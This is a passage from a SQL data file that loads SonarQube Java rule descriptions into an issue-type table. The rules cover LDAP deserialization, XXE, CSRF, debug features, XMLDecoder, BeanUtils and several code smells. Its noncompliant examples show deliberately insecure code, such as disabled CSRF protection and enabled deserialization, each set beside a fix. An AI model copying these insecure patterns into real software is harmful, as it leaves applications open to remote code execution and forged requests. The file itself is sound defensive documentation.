DirContext ctx = new InitialDirContext(env);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication">OWASP Top 10 2017 Category A2</a> - Broken Authentication </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/521.html">CWE-521</a> - Weak Password Requirements </li>
  <li> <a href="https://ldapwiki.com/wiki/Simple%20Authentication">ldapwiki.com</a>- Simple Authentication </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4434', 'Allowing deserialization of LDAP objects is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>JNDI supports the deserialization of objects from LDAP directories, which can lead to remote code execution.</p>
<p>This rule raises an issue when an LDAP search query is executed with <code>SearchControls</code> configured to allow deserialization.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The application connects to an untrusted LDAP directory. </li>
  <li> User-controlled objects can be stored in the LDAP directory. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to disable deserialization of LDAP objects.</p>
<h2>Sensitive Code Example</h2>
<pre>
DirContext ctx = new InitialDirContext();
// ...
ctx.search(query, filter,
        new SearchControls(scope, countLimit, timeLimit, attributes,
            true, // Noncompliant; allows deserialization
            deref));
</pre>
<h2>Compliant Solution</h2>
<pre>
DirContext ctx = new InitialDirContext();
// ...
ctx.search(query, filter,
        new SearchControls(scope, countLimit, timeLimit, attributes,
            false, // Compliant
            deref));
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://cwe.mitre.org/data/definitions/502.html">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization">OWASP Top 10 2017 Category A8</a> - Insecure Deserialization
  </li>
  <li> <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf">BlackHat
  presentation</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#LDAP_ENTRY_POISONING">LDAP_ENTRY_POISONING</a> </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4435', 'XML transformers should be secured', 'sonarqube', 'Vulnerability', '<p>An XML External Entity or XSLT External Entity (XXE) vulnerability can occur when a <code>javax.xml.transform.Transformer</code> is created without
enabling "Secure Processing" or when one is created without disabling resolving of both external DTDs and DTD entities. If that external data is being
controlled by an attacker it may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the
perspective of the machine where the parser is located, and other system impacts.</p>
<p>This rule raises an issue when a <code>Transformer</code> is created without either of these settings.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Transformer transformer = TransformerFactory.newInstance().newTransformer();
transformer.transform(input, result);
</pre>
<h2>Compliant Solution</h2>
<p>Recommended:</p>
<pre>
TransformerFactory factory = TransformerFactory.newInstance();
factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");

Transformer transformer = factory.newTransformer();

transformer.transform(input, result);
</pre>
<p>Implementation dependent:</p>
<pre>
TransformerFactory factory = TransformerFactory.newInstance();
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);

Transformer transformer = factory.newTransformer();

transformer.transform(input, result);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)">OWASP Top 10 2017 Category A4</a> - XML External Entities
  (XXE) </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#transformerfactory">OWASP XXE Cheat
  Sheet</a> </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/611.html">MITRE, CWE-611</a> - Improper Restriction of XML External Entity Reference (''XXE'')
  </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#XXE_DTD_TRANSFORM_FACTORY">XXE_DTD_TRANSFORM_FACTORY</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#XXE_XSLT_TRANSFORM_FACTORY">XXE_XSLT_TRANSFORM_FACTORY</a>
  </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href=''/coding_rules#rule_key=java%3AS2755''>S2755</a> instead.</p>', 'java', 'DEPRECATED', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4449', 'Nullness of parameters should be guaranteed', 'sonarqube', 'Code Smell', '<p>When using null-related annotations at global scope level, for instance using <code>javax.annotation.ParametersAreNonnullByDefault</code> (from
JSR-305) at package level, it means that all the parameters to all the methods included in the package will, or should, be considered
Non-<code>null</code>. It is equivalent to annotating every parameter in every method with non-null annotations (such as <code>@Nonnull</code>).</p>
<p>The rule raises an issue every time a parameter could be <code>null</code> for a method invocation, where the method is annotated as forbidding
null parameters.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@javax.annotation.ParametersAreNonnullByDefault
class A {

  void foo() {
    bar(getValue()); // Noncompliant - method ''bar'' do not expect ''null'' values as parameter
  }

  void bar(Object o) { // ''o'' is by contract expected never to be null
    // ...
  }

  @javax.annotation.CheckForNull
  abstract Object getValue();
}
</pre>
<h2>Compliant Solution</h2>
<p>Two solutions are possible: </p>
<ul>
  <li> The signature of the method is correct, and null check should be done prior to the call. </li>
  <li> The signature of the method is not coherent and should be annotated to allow null values being passed as parameter </li>
</ul>
<pre>
@javax.annotation.ParametersAreNonnullByDefault
abstract class A {

  void foo() {
      Object o = getValue();
      if (o != null) {
        bar(o); // Compliant - ''o'' can not be null
      }
  }

  void bar(Object o) {
    // ...
  }

  @javax.annotation.CheckForNull
  abstract Object getValue();
}
</pre>
<p>or </p>
<pre>
@javax.annotation.ParametersAreNonnullByDefault
abstract class A {

  void foo() {
    bar(getValue());
  }

  void bar(@javax.annotation.Nullable Object o) { // annotation was missing
    // ...
  }

  @javax.annotation.CheckForNull
  abstract Object getValue();
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4454', '"equals" method parameters should not be marked "@Nonnull"', 'sonarqube', 'Code Smell', '<p>By contract, the <code>equals(Object)</code> method, from <code>java.lang.Object</code>, should accept a <code>null</code> argument. Among all the
other cases, the <code>null</code> case is even explicitly detailed in the <code>Object.equals(...)</code> Javadoc, stating <em>"For any non-null
reference value x, x.equals(null) should return false."</em></p>
<p>Assuming that the argument to <code>equals</code> is always non-null, and enforcing that assumption with an annotation is not only a fundamental
violation of the contract of <code>equals</code>, but it is also likely to cause problems in the future as the use of the class evolves over time.</p>
<p>The rule raises an issue when the <code>equals</code> method is overridden and its parameter annotated with any kind of <code>@Nonnull</code>
annotation.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public boolean equals(@javax.annotation.Nonnull Object obj) { // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean equals(Object obj) {
  if (obj == null) {
    return false;
  }
  // ...
}
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4488', 'Composed "@RequestMapping" variants should be preferred', 'sonarqube', 'Code Smell', '<p>Spring framework 4.3 introduced variants of the <code>@RequestMapping</code> annotation to better represent the semantics of the annotated methods.
The use of <code>@GetMapping</code>, <code>@PostMapping</code>, <code>@PutMapping</code>, <code>@PatchMapping</code> and <code>@DeleteMapping</code>
should be preferred to the use of the raw <code>@RequestMapping(method = RequestMethod.XYZ)</code>.</p>
<h1>Noncompliant Code Example</h1>
<pre>
@RequestMapping(path = "/greeting", method = RequestMethod.GET) // Noncompliant
public Greeting greeting(@RequestParam(value = "name", defaultValue = "World") String name) {
...
}
</pre>
<h1>Compliant Solution</h1>
<pre>
@GetMapping(path = "/greeting") // Compliant
public Greeting greeting(@RequestParam(value = "name", defaultValue = "World") String name) {
...
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4499', 'SMTP SSL connection should check server identity', 'sonarqube', 'Vulnerability', '<p>This rule raises an issue when:</p>
<ul>
  <li> a JavaMail''s <code>javax.mail.Session</code> is created with a <code>Properties</code> object having no
  <code>mail.smtp.ssl.checkserveridentity</code> or <code>mail.smtps.ssl.checkserveridentity</code> not configured to <code>true</code> </li>
  <li> a Apache Common Emails''s <code>org.apache.commons.mail.SimpleEmail</code> is used with <code>setSSLOnConnect(true)</code> or
  <code>setStartTLSEnabled(true)</code> or <code>setStartTLSRequired(true)</code> without a call to <code>setSSLCheckServerIdentity(true)</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
Email email = new SimpleEmail();
email.setSmtpPort(465);
email.setAuthenticator(new DefaultAuthenticator(username, password));
email.setSSLOnConnect(true); // Noncompliant; setSSLCheckServerIdentity(true) should also be called before sending the email
email.send();
</pre>
<pre>
Properties props = new Properties();
props.put("mail.smtp.host", "smtp.gmail.com");
props.put("mail.smtp.socketFactory.port", "465");
props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory"); // Noncompliant; Session is created without having "mail.smtp.ssl.checkserveridentity" set to true
props.put("mail.smtp.auth", "true");
props.put("mail.smtp.port", "465");
Session session = Session.getDefaultInstance(props, new javax.mail.Authenticator() {
  protected PasswordAuthentication getPasswordAuthentication() {
    return new PasswordAuthentication("username@gmail.com", "password");
  }
});
</pre>
<h2>Compliant Solution</h2>
<pre>
Email email = new SimpleEmail();
email.setSmtpPort(465);
email.setAuthenticator(new DefaultAuthenticator(username, password));
email.setSSLOnConnect(true);
email.setSSLCheckServerIdentity(true); // Compliant
email.send();
</pre>
<pre>
Properties props = new Properties();
props.put("mail.smtp.host", "smtp.gmail.com");
props.put("mail.smtp.socketFactory.port", "465");
props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
props.put("mail.smtp.auth", "true");
props.put("mail.smtp.port", "465");
props.put("mail.smtp.ssl.checkserveridentity", true); // Compliant
Session session = Session.getDefaultInstance(props, new javax.mail.Authenticator() {
  protected PasswordAuthentication getPasswordAuthentication() {
    return new PasswordAuthentication("username@gmail.com", "password");
  }
});
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/297.html">CWE-297</a> - Improper Validation of Certificate with Host Mismatch </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href=''/coding_rules#rule_key=java%3AS5527''>S5527</a> instead.</p>', 'java', 'DEPRECATED', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4502', 'Disabling CSRF protections is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>A cross-site request forgery (CSRF) attack occurs when a trusted user of a web application can be forced, by an attacker, to perform sensitive
actions that he didn''t intend, such as updating his profile or sending a message, more generally anything that can change the state of the
application.</p>
<p>The attacker can trick the user/victim to click on a link, corresponding to the privileged action, or to visit a malicious web site that embeds a
hidden web request and as web browsers automatically include cookies, the actions can be authenticated and sensitive.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The web application uses cookies to authenticate users. </li>
  <li> There exist sensitive operations in the web application that can be performed when the user is authenticated. </li>
  <li> The state / resources of the web application can be modified by doing HTTP POST or HTTP DELETE requests for example. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Protection against CSRF attacks is strongly recommended:
    <ul>
      <li> to be activated by default for all <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods">unsafe HTTP
      methods</a>. </li>
      <li> implemented, for example, with an unguessable CSRF token </li>
    </ul> </li>
  <li> Of course all sensitive operations should not be performed with <a
  href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods">safe HTTP</a> methods like <code>GET</code> which are designed to be
  used only for information retrieval. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p><a href="https://docs.spring.io/spring-security/site/docs/3.2.0.CI-SNAPSHOT/reference/html/csrf.html">Spring Security</a> provides by default a
protection against CSRF attacks which can be disabled:</p>
<pre>
@EnableWebSecurity
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {

  @Override
  protected void configure(HttpSecurity http) throws Exception {
    http.csrf().disable(); // Sensitive: csrf protection is entirely disabled
   // or
    http.csrf().ignoringAntMatchers("/route/"); // Sensitive: csrf protection is disabled for specific routes
  }
}
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://docs.spring.io/spring-security/site/docs/3.2.0.CI-SNAPSHOT/reference/html/csrf.html">Spring Security</a> CSRF protection is
enabled by default, do not disable it:</p>
<pre>
@EnableWebSecurity
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {

  @Override
  protected void configure(HttpSecurity http) throws Exception {
    // http.csrf().disable(); // Compliant
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://cwe.mitre.org/data/definitions/352.html">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://owasp.org/www-community/attacks/csrf">OWASP: Cross-Site Request Forgery</a> </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat1">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4507', 'Delivering code in production with debug features activated is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Delivering code in production with debug features activated is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1999007">CVE-2018-1999007</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5306">CVE-2015-5306</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2006">CVE-2013-2006</a> </li>
</ul>
<p>An application''s debug features enable developers to find bugs more easily and thus facilitate also the work of attackers. It often gives access to
detailed information on both the system running the application and users. </p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code or configuration enabling the application debug features is deployed on production servers. </li>
  <li> the application runs by default with debug features activated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debug features on production servers.</p>
<h2>Sensitive Code Example</h2>
<p><code>Throwable.printStackTrace(...)</code> prints a Throwable and its stack trace to <code>System.Err</code> (by default) which is not easily
parseable and can expose sensitive information:</p>
<pre>
try {
  /* ... */
} catch(Exception e) {
  e.printStackTrace();        // Sensitive
}
</pre>
<p><a
href="https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/config/annotation/web/configuration/EnableWebSecurity.html">EnableWebSecurity</a>
annotation for SpringFramework with <code>debug</code> to <code>true</code> enable debugging support:</p>
<pre>
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;

@Configuration
@EnableWebSecurity(debug = true) // Sensitive
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<p>Loggers should be used (instead of <code>printStackTrace</code>) to print throwables:</p>
<pre>
try {
  /* ... */
} catch(Exception e) {
  LOGGER.log("context", e); // Compliant
}
</pre>
<p><a
href="https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/config/annotation/web/configuration/EnableWebSecurity.html">EnableWebSecurity</a>
annotation for SpringFramework with <code>debug</code> to <code>false</code> disable debugging support:</p>
<pre>
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;

@Configuration
@EnableWebSecurity(debug = false) // Compliant
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/215.html">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4508', 'Deserializing objects from an untrusted source is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Deserializing objects is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10654">CVE-2018-10654</a>: Hazelcast Library: Java deserialization
  vulnerability </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000058">CVE-2018-1000058</a>: Jenkins Pipeline: arbitrary code execution
  vulnerability </li>
</ul>
<p>Object deserialization from an untrusted source can lead to unexpected code execution. <code>ObjectInputStream</code> doesn''t provide a way to
apply rules on its <code>InputStream</code> argument. Knowing that all serializable classes in the scope of the classloader will be deserialized,
there is a possibility that malicious code could be executed during the deserialization phase even if, in the end, a <code>ClassCastException</code>
will be raised.</p>
<p>Deserialization takes a stream of bits and turns it into an object. If the stream contains the type of object you expect, all is well. But if
you''re deserializing untrusted input, and an attacker has inserted some other type of object, you''re in trouble. Why? There are a few different attack
scenarios, but one widely-documented one goes like this: Deserialization first instantiates an <code>Object</code>, then uses the
<code>readObject</code> method to populate it. If the attacker has overridden <code>readObject</code> then he is entirely in control of what code
executes during that process. It is only after <code>readObject</code> has completed that your newly-minted <code>Object</code> can be cast to the
type you expected. A <code>ClassCastException</code> or <code>ClassNotFoundException</code> will be thrown, but at that point it''s too late.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> an attacker could have tampered with the source provided to the deserialization function. </li>
  <li> you are using an unsafe deserialization function. See the <strong>Recommended Secure Coding Practices</strong> for examples of safe libraries.
  </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>To prevent insecure deserialization, you should either use look-ahead deserialization (pre-Java 9) or a filter to make sure you''re dealing with the
correct type of object <em>before</em> you act on it.</p>
<p>Several third-party libraries offer look-ahead deserialization, including:</p>
<ul>
  <li> ikkisoft''s <code>SerialKiller</code> </li>
  <li> Apache Commons Class IO''s <code>ValidatingObjectInputStream</code> </li>
  <li> contrast-rO0''s <code>SafeObjectInputStream</code> </li>
</ul>
<p>Note that it is possible to set a deserialization filter at the level of the JVM, but relying on that requires that your environment be configured
perfectly. Every time. Additionally, such a filter may have unwanted impacts on other applications in the environment. On the other hand, setting a
filter as close as possible to the deserialization that uses it allows you to specify a very narrow, focused filter.</p>
<p>You should also limit access to the serialized source. For example:</p>
<ul>
  <li> if it is a file, restrict the access to it. </li>
  <li> if it comes from the network, restrict who has access to the process, such as with a Firewall or by authenticating the sender first. </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Deserialization_of_untrusted_data">OWASP - Deserialization of untrusted data</a> </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization">OWASP Top 10 2017 Category A8</a> - Insecure Deserialization
  </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/502.html">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#OBJECT_DESERIALIZATION">OBJECT_DESERIALIZATION </a> </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>', 'java', 'DEPRECATED', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4510', 'Deserializing with XMLDecoder is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Deserialization from an untrusted source using the XMLDecoder library can lead to unexpected code execution. For example, it has led in the past to
the following vulnerability:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4221">CVE-2013-4221</a> </li>
</ul>
<p>XMLDecoder supports arbitrary method invocation. This capability is intended to call setter methods only but nothing prevents the execution of any
other method.</p>
<p>This rule raises an issue when XMLDecoder is instantiated. The call to "readObject" is also highlighted to show where the malicious code can be
executed.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the XML input can come from an untrusted source and be tainted by a hacker. (*) </li>
  <li> you require the advanced functionalities provided by the XMLDecoder class. If you simply need to deserialize XML you can use a more secure
  deserialization function. </li>
</ul>
<p>(*) You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>If you only need a simple deserialization, use instead one of the deserialization libraries <a
href="https://www.owasp.org/index.php/Deserialization_Cheat_Sheet#Mitigation_Tools.2FLibraries">recommended by OWASP</a>.</p>
<p>If you really need to use XMLDecoder, make sure that the serialized data cannot be tampered with.</p>
<h2>Sensitive Code Example</h2>
<pre>
public void decode(InputStream in) {
  XMLDecoder d = new XMLDecoder(in); // Sensitive
  Object result = d.readObject();
  [...]
  d.close();
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">OWASP Top 10 2017 Category A1</a> - Injection </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization">OWASP Top 10 2017 Category A8</a> - Insecure Deserialization
  </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/502.html">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li>
  <li> <a href="https://www.owasp.org/index.php/Deserialization_of_untrusted_data">OWASP Deserialization of untrusted data</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#XML_DECODER">XML_DECODER </a> </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>', 'java', 'DEPRECATED', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4512', 'Setting JavaBean properties is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Setting JavaBean properties is security sensitive. Doing it with untrusted values has led in the past to the following vulnerability:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0114">CVE-2014-0114</a> </li>
</ul>
<p>JavaBeans can have their properties or nested properties set by population functions. An attacker can leverage this feature to push into the
JavaBean malicious data that can compromise the software integrity. A typical attack will try to manipulate the ClassLoader and finally execute
malicious code.</p>
<p>This rule raises an issue when:</p>
<ul>
  <li> BeanUtils.populate(...) or BeanUtilsBean.populate(...) from <a href="http://commons.apache.org/proper/commons-beanutils/">Apache Commons
  BeanUtils</a> are called </li>
  <li> BeanUtils.setProperty(...) or BeanUtilsBean.setProperty(...) from <a href="http://commons.apache.org/proper/commons-beanutils/">Apache Commons
  BeanUtils</a> are called </li>
  <li> org.springframework.beans.BeanWrapper.setPropertyValue(...) or org.springframework.beans.BeanWrapper.setPropertyValues(...) from Spring is
  called </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the new property values might have been tampered with or provided by an untrusted source. </li>
  <li> sensitive properties can be modified, for example: <code>class.classLoader</code> </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Sanitize all values used as JavaBean properties.</p>
<p>Don''t set any sensitive properties. Keep full control over which properties are set. If the property names are provided by an unstrusted source,
filter them with a whitelist.</p>
<h2>Sensitive Code Example</h2>
<pre>
Company bean = new Company();
HashMap map = new HashMap();
Enumeration names = request.getParameterNames();
while (names.hasMoreElements()) {
    String name = (String) names.nextElement();
    map.put(name, request.getParameterValues(name));
}
BeanUtils.populate(bean, map); // Sensitive: "map" is populated with data coming from user input, here "request.getParameterNames()"
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">OWASP Top 10 2017 Category A1</a> - Injection </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/15.html">MITRE, CWE-15</a> - External Control of System or Configuration Setting </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#BEAN_PROPERTY_INJECTION">BEAN_PROPERTY_INJECTION</a> </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4517', 'InputSteam.read() implementation should not return a signed byte', 'sonarqube', 'Bug', '<p>According to the Java documentation, any implementation of the <code>InputSteam.read()</code> method is supposed to read the next byte of data from
the input stream. The value byte must be an <code>int</code> in the range 0 to 255. If no byte is available because the end of the stream has been
reached, the value -1 is returned.</p>
<p>But in Java, the <code>byte</code> primitive data type is an 8-bit signed two''s complement integer. It has a minimum value of -128 and a maximum
value of 127. So by contract, the implementation of an <code>InputSteam.read()</code> method should never directly return a <code>byte</code>
primitive data type. A conversion into an unsigned byte must be done before by applying a bitmask.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Override
public int read() throws IOException {
  if (pos == buffer.length()) {
    return -1;
  }
  return buffer.getByte(pos++); // Noncompliant, a signed byte value is returned
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Override
public int read() throws IOException {
  if (pos == buffer.length()) {
    return -1;
  }
  return buffer.getByte(pos++) &amp; 0xFF; // The 0xFF bitmask is applied
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4524', '"default" clauses should be last', 'sonarqube', 'Code Smell', '<p><code>switch</code> can contain a <code>default</code> clause for various reasons: to handle unexpected values, to show that all the cases were
properly considered.</p>
<p>For readability purpose, to help a developer to quickly find the default behavior of a <code>switch</code> statement, it is recommended to put the
<code>default</code> clause at the end of the <code>switch</code> statement. This rule raises an issue if the <code>default</code> clause is not the
last one of the <code>switch</code>''s cases.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (param) {
  case 0:
    doSomething();
    break;
  default: // default clause should be the last one
    error();
    break;
  case 1:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (param) {
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
  default:
    error();
    break;
}
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4530', 'Using Struts 1 ActionForm is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Using Struts 1 ActionForm is security-sensitive. For example, their use has led in the past to the following vulnerability:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0114">CVE-2014-0114</a> </li>
</ul>
<p>All classes extending <code>org.apache.struts.action.Action</code> are potentially remotely reachable. The <code>ActionForm</code> object provided
as a parameter of the <code>execute</code> method is automatically instantiated and populated with the HTTP parameters. One should review the use of
these parameters to be sure they are used safely. </p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> some parameters of the ActionForm might not have been validated properly. </li>
  <li> dangerous parameter names are accepted. Example: accept a "class" parameter and use the form to populate JavaBean properties (see the
  CVE-2014-0114 above). </li>
  <li> there are unused fields which are not empty or undefined. </li>
</ul>
<p>You are at risk if you answered to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>All ActionForm''s properties should be validated, including their size. Whenever possible, filter the parameters with a whitelist of valid values.
Otherwise, escape any sensitive character and constrain the values as much as possible.</p>
<p>Allow only non security-sensitive property names. All the ActionForm''s property names should be whitelisted.</p>
<p>Unused fields should be constrained so that they are either empty or undefined.</p>
<h1>Noncompliant Code Example</h1>
<pre>
// Struts 1.1+
public final class CashTransferAction extends Action {

  public String fromAccount = "";
  public String toAccount = "";

  public ActionForward execute(ActionMapping mapping, ActionForm form, HttpServletRequest req, HttpServletResponse res) throws Exception {
    // usage of the "form" object to call some services doing JDBC actions
    [...]
    return mapping.findForward(resultat);
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">OWASP Top 10 2017 Category A1</a> - Injection </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/105.html">MITRE, CWE-105</a>: Struts Form Field Without Validator </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>', 'java', 'DEPRECATED', 'MAJOR', 'BLOCK');
